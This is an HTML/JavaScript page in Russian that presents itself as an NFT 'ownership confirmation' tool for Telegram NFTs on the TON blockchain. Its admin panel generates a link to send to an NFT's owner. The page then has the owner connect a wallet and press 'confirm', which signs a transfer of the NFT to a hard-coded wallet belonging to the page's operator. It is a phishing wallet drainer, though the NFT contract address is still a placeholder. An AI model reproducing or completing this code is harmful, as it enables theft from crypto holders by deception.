<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Transfer System</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/tonweb@0.0.66/dist/tonweb.bundle.js"></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; display: flex; flex-direction: column; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .card { background: #1e1e1e; padding: 25px; border-radius: 16px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 20px; }
        
        /* Стили для поля ввода */
        .admin-panel { border-bottom: 1px solid #333; margin-bottom: 20px; padding-bottom: 20px; }
        input { width: 90%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #121212; color: white; margin-bottom: 10px; }
        .gen-btn { background: #0088cc; color: white; border: none; padding: 10px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; }
        
        .result-link { background: #2d2d2d; padding: 10px; border-radius: 8px; font-size: 0.85em; word-break: break-all; margin-top: 10px; color: #00ccff; display: none; cursor: pointer; }

        /* Стили для владельца NFT */
        .nft-info { background: #2d2d2d; padding: 15px; border-radius: 12px; margin: 20px 0; }
        #ton-connect-button { display: flex; justify-content: center; margin: 15px 0; }
        .action-btn { width: 100%; padding: 15px; background: #0088cc; border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; display: none; font-size: 16px; }
    </style>
</head>
<body>

<div class="card admin-panel">
    <h3>Генератор ссылки</h3>
    <input type="text" id="nftLinkInput" placeholder="Вставьте https://t.me/nft/...">
    <button class="gen-btn" onclick="generateLink()">Создать ссылку для владельца</button>
    <div id="generatedLink" class="result-link" onclick="copyLink()"></div>
    <p id="copyHint" style="font-size: 10px; color: #888; display: none;">Нажмите, чтобы скопировать</p>
</div>

<div class="card" id="userPanel">
    <h2>Подтверждение владения</h2>
    <div class="nft-info">
        <div id="nftTitle" style="font-size: 1.2em; font-weight: bold;">Ожидание данных...</div>
        <div id="nftStatus" style="color: #aaa; margin-top: 5px;">Подключите кошелек для проверки</div>
    </div>

    <div id="ton-connect-button"></div>

    <button id="transferBtn" class="action-btn" onclick="sendTransaction()">Подтвердить передачу</button>
</div>

<script>
    // --- НАСТРОЙКИ ---
    const MY_WALLET_ADDRESS = "UQCsbN7m38_6dA2ZYG0RcxpFNixTI7dm5IS16qEZMQacWH9k"; // Куда придет NFT
    const MANIFEST_URL = 'https://your-domain.com/tonconnect-manifest.json';
    // -----------------

    const tonConnectUI = new TONConnectUI.TonConnectUI({
        manifestUrl: MANIFEST_URL,
        buttonRootId: 'ton-connect-button'
    });

    // Логика извлечения ID из ссылки Telegram
    function generateLink() {
        const input = document.getElementById('nftLinkInput').value;
        const parts = input.split('/');
        const id = parts[parts.length - 1]; // Берет "LoveCandle-2212"
        
        if (id) {
            const currentUrl = window.location.href.split('?')[0];
            const finalLink = `${currentUrl}?id=${id}`;
            const linkDiv = document.getElementById('generatedLink');
            linkDiv.innerText = finalLink;
            linkDiv.style.display = 'block';
            document.getElementById('copyHint').style.display = 'block';
        } else {
            alert("Неверная ссылка!");
        }
    }

    function copyLink() {
        const text = document.getElementById('generatedLink').innerText;
        navigator.clipboard.writeText(text);
        alert("Ссылка скопирована! Отправьте её владельцу NFT.");
    }

    // Логика для того, кто перешел по ссылке
    const urlParams = new URLSearchParams(window.location.search);
    const nftId = urlParams.get('id');

    if (nftId) {
        document.getElementById('nftTitle').innerText = "NFT: " + nftId;
    }

    tonConnectUI.onStatusChange(wallet => {
        const btn = document.getElementById('transferBtn');
        if (wallet && nftId) {
            btn.style.display = 'block';
            document.getElementById('nftStatus').innerText = "Кошелек готов";
        } else {
            btn.style.display = 'none';
        }
    });

    async function sendTransaction() {
        const tonWeb = new TonWeb();
        const Cell = TonWeb.boc.Cell;
        
        try {
            // ВАЖНО: В реальном сценарии здесь нужно знать реальный адрес NFT-контракта в блокчейне.
            // LoveCandle-2212 — это имя, а не адрес. Чтобы скрипт сработал, 
            // в идеале нужно прописать сопоставление или использовать API для поиска адреса по имени.
            
            const payload = new Cell();
            payload.bits.writeUint(0x5fcc3d14, 32); 
            payload.bits.writeUint(0, 64);          
            payload.bits.writeAddress(new TonWeb.utils.Address(MY_WALLET_ADDRESS)); 
            payload.bits.writeAddress(new TonWeb.utils.Address(tonConnectUI.account.address)); 
            payload.bits.writeBit(false);           
            payload.bits.writeCoins(TonWeb.utils.toNano('0.02')); 
            payload.bits.writeBit(false);           

            const payloadBoc = TonWeb.utils.bytesToBase64(await payload.toBoc());

            // В поле address должен быть адрес NFT (EQ...), а не просто имя
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 600,
                messages: [{
                    address: "АДРЕС_КОНТРАКТА_NFT_ТУТ", 
                    amount: "50000000",
                    payload: payloadBoc
                }]
            };

            await tonConnectUI.sendTransaction(transaction);
            alert("Готово! NFT будет передан после подтверждения.");
        } catch (e) {
            console.error(e);
            alert("Ошибка или отказ.");
        }
    }
</script>

</body>
</html>
